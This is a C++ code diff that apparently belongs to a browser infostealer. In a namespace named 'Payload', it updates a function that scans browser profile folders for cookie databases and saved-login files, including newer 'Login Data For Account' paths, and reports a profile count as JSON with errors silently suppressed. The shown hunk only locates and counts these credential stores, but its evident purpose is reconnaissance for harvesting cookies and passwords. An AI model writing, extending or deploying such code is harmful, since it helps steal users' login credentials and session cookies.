@@ -184,17 +184,50 @@ namespace Payload {
 
         void ExtractProfileCount(std::ostringstream& json) {
             int profileCount = 0;
+            
             try {
+                if (!std::filesystem::exists(m_browser.userDataPath)) {
+                    json << "  \"profile_count\": 0,\n";
+                    return;
+                }
+
                 for (const auto& entry : std::filesystem::directory_iterator(m_browser.userDataPath)) {
-                    if (entry.is_directory()) {
-                        auto cookiePath = entry.path() / "Network" / "Cookies";
-                        auto loginPath = entry.path() / "Login Data";
-                        if (std::filesystem::exists(cookiePath) || std::filesystem::exists(loginPath)) {
-                            profileCount++;
-                        }
+                    if (!entry.is_directory()) continue;
+                    
+                    auto profilePath = entry.path();
+                    auto networkPath = profilePath / "Network";
+                    
+                    auto cookiePath = networkPath / "Cookies";
+                    bool hasCookies = std::filesystem::exists(cookiePath);
+                    
+                    bool hasLoginData = false;
+                    
+                    // "Login Data For Account" (Currently)
+                    auto loginPathV2 = profilePath / "Login Data For Account";
+                    if (std::filesystem::exists(loginPathV2)) {
+                        hasLoginData = true;
+                    } 
+                    // "Login Data" (legacy)
+                    else {
+                        auto loginPathV1 = profilePath / "Login Data";
+                        hasLoginData = std::filesystem::exists(loginPathV1);
+                    }
+                    if (!hasLoginData) {
+                        auto loginPathNetwork = networkPath / "Login Data";
+                        hasLoginData = std::filesystem::exists(loginPathNetwork);
+                    }
+                    if (hasCookies || hasLoginData) {
+                        profileCount++;
                     }
                 }
-            } catch (...) {}
+            } 
+            catch (const std::filesystem::filesystem_error& e) {
+                // std::cerr << "Filesystem error: " << e.what() << std::endl;
+            }
+            catch (...) {
+
+            }
+            
             json << "  \"profile_count\": " << profileCount << ",\n";
         }
 
